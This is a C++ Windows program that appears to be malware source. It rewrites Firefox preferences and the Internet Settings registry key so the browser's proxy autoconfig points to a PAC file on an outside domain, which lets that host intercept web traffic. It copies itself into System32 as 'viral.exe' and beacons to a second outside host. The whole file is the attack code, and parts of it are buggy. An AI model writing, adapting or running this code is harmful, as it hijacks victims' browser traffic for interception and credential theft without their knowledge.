#include <locale>
#include <stdio.h>
#include <winsock2.h>
#include <iostream>
#include <tchar.h>
#include <fstream>
#include <dirent.h>
#include <wininet.h>
#include <windows.h>
#include <string>
#include <vector>
#include <stdlib.h>
#pragma comment(lib,"ws2_32.lib")

int num_dirs(const char* path);

using namespace std;

char windir[MAX_PATH];

int httpGet(char* host, char* params)
{
    HINTERNET hIntSession =
      ::InternetOpen(_T("MyApp"), INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);

    HINTERNET hHttpSession =
      InternetConnect(hIntSession, _T(host), 80, 0, 0, INTERNET_SERVICE_HTTP, 0, NULL);

    HINTERNET hHttpRequest = HttpOpenRequest(
      hHttpSession,
      _T("GET"),
      _T(params),
      0, 0, 0, INTERNET_FLAG_RELOAD, 0);

    TCHAR* szHeaders = _T("Content-Type: text/html\nMySpecialHeder: whatever");
    CHAR szReq[1024] = "";
    if( !HttpSendRequest(hHttpRequest, szHeaders, _tcslen(szHeaders), szReq, strlen(szReq))) {
      DWORD dwErr = GetLastError();
      /// handle error
    }

    CHAR szBuffer[1025];
    DWORD dwRead=0;
    while(::InternetReadFile(hHttpRequest, szBuffer, sizeof(szBuffer)-1, &dwRead) && dwRead) {
      szBuffer[dwRead] = 0;
      OutputDebugStringA(szBuffer);
      dwRead=0;
    }
    printf("%s",szBuffer);
    ::InternetCloseHandle(hHttpRequest);
    ::InternetCloseHandle(hHttpSession);
    ::InternetCloseHandle(hIntSession);
    return 0;
}

int appendText(char* path, char* text)
{
    std::ofstream outfile;

    outfile.open(path, std::ios_base::app);
    outfile << text;
}



int main(int argc, char* argv[])
{

    char *host = argv[1];
    char *params = argv[2];
    printf("\n%s\n%s", host);
    setlocale( LC_ALL,"Russian" );
    const char* appdata = getenv("APPDATA");
    string path;
    path.append(appdata);
    path.append("\\Mozilla\\Firefox\\Profiles\\");
    DIR *dir = opendir(path.c_str());
    char *folder = "nope";
    struct dirent *entry = readdir(dir);

    while (entry != NULL)
    {
        if(entry->d_name != "exists")
        {
            folder = entry->d_name;
            printf("\n");
            entry = readdir(dir);
        }
    }

    if(folder != "nope")
    {
        char *ffAppend = "user_pref(\"network.proxy.autoconfig_url\", \"http://reestru.net/prx.pac\"); \n user_pref(\"network.proxy.type\", 2);";
        string way = path;
        way.append(folder);
        way.append("\\prefs.js");
        appendText((char *)way.c_str(), ffAppend);
    }
    closedir(dir);
	char pathname[256];
	HKEY hKey;
	GetWindowsDirectory(windir, sizeof(windir));
	HMODULE hMe = GetModuleHandle(NULL);
	DWORD nRet = GetModuleFileName(hMe, pathname, 256);

	strcat(windir, "\\System32\\viral.exe");
	CopyFile(pathname, windir, 0);

	unsigned char reg[27] = "http://reestru.net/prx.pac";

	RegCreateKey(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings", &hKey);
	RegSetValueEx(hKey, "AutoConfigURL", 0, REG_SZ, reg, sizeof(reg));
	RegCloseKey(hKey);
	httpGet("kiptop.net","/Statistics/Default.aspx?id=oops&ip=194.247.12.76&nff=0&adNET=default");
	httpGet(host, params);
	return 0;
}
